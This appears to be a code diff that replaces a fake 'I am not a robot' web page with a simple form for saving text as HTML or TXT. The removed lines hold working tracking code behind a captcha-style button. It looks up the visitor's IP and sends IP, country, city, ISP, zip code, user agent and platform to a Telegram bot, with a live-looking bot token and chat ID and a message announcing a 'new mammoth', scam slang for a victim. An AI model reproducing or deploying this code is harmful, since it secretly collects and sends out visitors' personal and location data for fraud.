@@ -1,164 +1,41 @@
-<center>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script> 
-<button onclick="start()">Я не робот</button>
-</center>
-<script>
-	start = function() {
-		var requestUrl = "http://ip-api.com/json";
+<html>
+  <head></head>
+  <body>
 
-$.ajax({
-  url: requestUrl,
-  type: 'GET',
-  success: function(json)
-  {
-  	var hello = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Новый мамонт!"
+    <form name="addtext" onsubmit="download(this['name'].value, this['text'].value)">
 
-var xhr = new XMLHttpRequest();
-xhr.open("POST", hello);
+    <textarea rows="10" cols="70" name="text" placeholder="Type your text here:"></textarea>
+    <br>
+    <input type="text" name="name" value="" placeholder="File Name">
+    <input type="submit" onClick="addTextHTML();" value="Save As HTML">
+    <input type="submit" onClick="addTexttxt();" value="Save As TXT">
 
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
+    </form>
+    <script>
+    	function download(filename, text) {
+  var pom = document.createElement('a');
+  pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + 
 
-xhr.send();
+encodeURIComponent(text));
+  pom.setAttribute('download', filename);
 
-var code = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Кодовое имя браузера: "+navigator.appCodeName
+  pom.style.display = 'none';
+  document.body.appendChild(pom);
 
-var xhr = new XMLHttpRequest();
-xhr.open("POST", code);
+  pom.click();
 
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
+  document.body.removeChild(pom);
+}
 
-xhr.send();
+function addTextHTML()
+{
+    document.addtext.name.value = document.addtext.name.value + ".html"
+}
 
-var name = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Имя браузера: "+navigator.appName
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", name);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var cookies = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Куки: "+navigator.cookieEnabled
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", cookies);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var language = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Язык: "+navigator.language
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", language);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var platform = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Платформа: "+navigator.platform
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", platform);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var product = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Имя движка браузера: "+navigator.product
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", product);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var ua = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Юзер агент: "+navigator.userAgent
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", ua);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var ip = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Айпи: "+json.query
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", ip);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var country = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Страна: "+json.country
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", country);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var city = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Город: "+json.city
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", city);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var prov = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Провайдер: "+json.isp
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", prov);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-
-var zip = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Индекс: "+json.zip
-
-var xhr = new XMLHttpRequest();
-xhr.open("POST", zip);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader("Content-Length", "0");
-
-xhr.send();
-    
-  },
-  error: function(err)
-  {
-    console.log("Request failed, error= " + err);
-  }
-});
-		}
-	</script>
+function addTextTXT()
+{
+    document.addtext.name.value = document.addtext.name.value + ".txt"
+}
+    	</script>
+  </body>
+</html>
